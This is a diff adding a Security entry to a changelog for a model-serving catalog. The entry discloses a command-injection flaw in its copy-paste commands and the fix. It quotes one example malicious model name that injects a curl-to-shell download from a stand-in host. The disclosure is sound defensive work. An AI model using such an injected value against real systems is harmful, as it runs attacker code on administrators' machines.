@@ -205,6 +205,19 @@ only accepts a tag whose version is the top dated section. See
   pinned by digest. A project variable `DOCKER_HUB` points it elsewhere
   (`docker.io`, or GitLab's Dependency Proxy).
 
+### Security
+
+- **Models' copy-paste commands could run what a project editor wrote.**
+  The name a model serves (`spec.model.name`), which anyone who can edit
+  its project sets on any model of a catalog name, went unquoted into the
+  Use it commands' request bodies, so a name such as
+  `x"}'; curl https://evil/p|sh; echo '` ran when a cluster-admin pasted
+  them. The commands now build every body as JSON and single-quote it
+  (names elsewhere are quoted unless plain), and the backend shows, puts
+  in commands and calls a model with a served name only when it is
+  letters, digits and `. _ / : -`; otherwise Use it shows no commands and
+  says why.
+
 ## [3.0.0] - 2026-11-18
 
 ### Added
